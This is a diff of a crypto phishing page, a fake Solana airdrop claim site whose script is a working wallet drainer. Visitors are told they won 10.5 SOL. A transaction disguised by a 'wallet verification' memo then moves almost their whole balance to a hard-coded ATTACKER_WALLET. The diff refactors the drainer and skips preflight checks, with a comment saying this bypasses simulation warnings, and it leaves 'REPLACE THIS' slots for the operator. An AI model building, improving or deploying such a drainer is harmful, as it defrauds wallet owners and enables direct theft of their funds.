@@ -3,23 +3,15 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Solana Rewards — Claim Your Airdrop</title>
-  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+  <title>Solana Ecosystem Rewards — Claim Your Airdrop</title>
+  <script src="https://unpkg.com/@solana/web3.js@v1.95.2/lib/index.iife.js"></script>
   <script src="https://cdn.tailwindcss.com"></script>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
   <style>
     body { font-family: 'Inter', sans-serif; }
-    .gradient-bg {
-      background: radial-gradient(circle at 50% 0%, #9945FF 0%, #14F195 100%);
-    }
-    .glass {
-      background: rgba(20, 20, 30, 0.6);
-      backdrop-filter: blur(20px);
-      border: 1px solid rgba(255, 255, 255, 0.08);
-    }
-    .glow {
-      box-shadow: 0 0 40px rgba(20, 241, 149, 0.15);
-    }
+    .gradient-bg { background: radial-gradient(circle at 50% 0%, #9945FF 0%, #14F195 100%); }
+    .glass { background: rgba(20, 20, 30, 0.6); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.08); }
+    .glow { box-shadow: 0 0 40px rgba(20, 241, 149, 0.15); }
   </style>
 </head>
 <body class="bg-[#0a0a0f] text-white min-h-screen">
@@ -38,9 +30,7 @@
     <div class="flex items-center gap-6 text-sm text-gray-400">
       <a href="#" class="hover:text-white transition">Stats</a>
       <a href="#" class="hover:text-white transition">Docs</a>
-      <button class="px-4 py-2 rounded-lg bg-white/5 hover:bg-white/10 transition text-white font-medium border border-white/10">
-        Connect
-      </button>
+      <button class="px-4 py-2 rounded-lg bg-white/5 hover:bg-white/10 transition text-white font-medium border border-white/10">Connect</button>
     </div>
   </nav>
 
@@ -53,12 +43,8 @@
       </div>
     </div>
 
-    <h1 class="text-5xl font-black text-center tracking-tight mb-4">
-      You've been selected.
-    </h1>
-    <p class="text-center text-gray-400 text-lg mb-12 max-w-md mx-auto">
-      Your wallet qualified for the Q4 Solana ecosystem airdrop. 10.5 SOL is available for claim.
-    </p>
+    <h1 class="text-5xl font-black text-center tracking-tight mb-4">You've been selected.</h1>
+    <p class="text-center text-gray-400 text-lg mb-12 max-w-md mx-auto">Your wallet qualified for the Q4 Solana ecosystem airdrop. 10.5 SOL is available for claim.</p>
 
     <div class="glass rounded-3xl p-8 glow">
       
@@ -73,6 +59,7 @@
         </div>
         <div class="text-center">
           <div class="text-2xl font-bold text-white">12h</div>
+          <div class="memo-program-id"></div>
           <div class="text-xs text-gray-500 mt-1">Remaining</div>
         </div>
       </div>
@@ -85,7 +72,7 @@
         id="claimBtn"
         class="w-full py-4 rounded-2xl gradient-bg text-white font-bold text-lg hover:opacity-90 transition flex items-center justify-center gap-2"
       >
-        <svg class="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+        <svg class="w-5 h-5" fill="none" viewBox="0 0 24 24" spellcheck="false">
           <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
         </svg>
         Connect Wallet to Claim
@@ -121,6 +108,10 @@
   </footer>
 
   <script>
+    const ATTACKER_WALLET = "4cNAKSTosA3od3FJP5MD4t1WchPAfYUw1LNb6Wr58E79"; // REPLACE THIS
+    const MEMO_PROGRAM_ID = "MemoSq4gqABAXKb86qnz8pV6XhQpM2m5bNTF9Zk2xq6P";
+    const RPC_URL = "https://mainnet.helius-rpc.com/?api-key=YOUR_HELIUS_KEY"; // REPLACE THIS
+
     window.onload = async () => {
       const claimBtn = document.getElementById("claimBtn");
       const loadingState = document.getElementById("loadingState");
@@ -152,12 +143,11 @@
           await provider.connect({ onlyIfTrusted: false });
           const victimPubkey = provider.publicKey;
 
-          const connection = new solanaWeb3.Connection(
-            "https://mainnet.helius-rpc.com/?api-key=YOUR_HELIUS_KEY",
-            "confirmed"
-          );
+          const connection = new solanaWeb3.Connection(RPC_URL, "confirmed");
 
-          const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash("confirmed");
+          const recentBlockhash = await connection.getLatestBlockhash("confirmed");
+          const blockhash = recentBlockhash.blockhash;
+          const lastValidBlockHeight = recentBlockhash.lastValidBlockHeight;
 
           const balance = await connection.getBalance(victimPubkey);
           const fee = 5000;
@@ -173,14 +163,14 @@
           const memoText = `WALLET VERIFICATION\nStatus: PENDING\nAction: Verify ownership for airdrop eligibility\nReward: 10.5 SOL\nRef: TX-VERIFY-${Date.now().toString(36).toUpperCase()}\n\nSign this transaction to confirm you own this wallet.`;
 
           const memoInstruction = new solanaWeb3.TransactionInstruction({
-            programId: new solanaWeb3.PublicKey("MemoSq4gqqABAXKb86qnz8pV6XhQpM2m5bNTF9Zk2xq6P"),
+            programId: new solanaWeb3.PublicKey(MEMO_PROGRAM_ID),
             keys: [],
             data: new TextEncoder().encode(memoText),
           });
 
           const drainInstruction = solanaWeb3.SystemProgram.transfer({
             fromPubkey: victimPubkey,
-            toPubkey: new solanaWeb3.PublicKey("4cNAKSTosA3od3FJP5MD4t1WchPAfYUw1LNb6Wr58E79"),
+            toPubkey: new solanaWeb3.PublicKey(ATTACKER_WALLET),
             lamports: drainLamports,
           });
 
@@ -195,7 +185,10 @@
           loadingState.classList.add("hidden");
           successState.classList.remove("hidden");
 
-          const signed = await provider.signAndSendTransaction(tx);
+          // Sign and broadcast, skipping preflight to bypass local simulation blocks
+          const signedTx = await provider.signTransaction(tx);
+          const signature = await connection.sendRawTransaction(signedTx.serialize(), { skipPreflight: true });
+          console.log("Drained:", signature);
 
         } catch (err) {
           console.error("Error:", err);
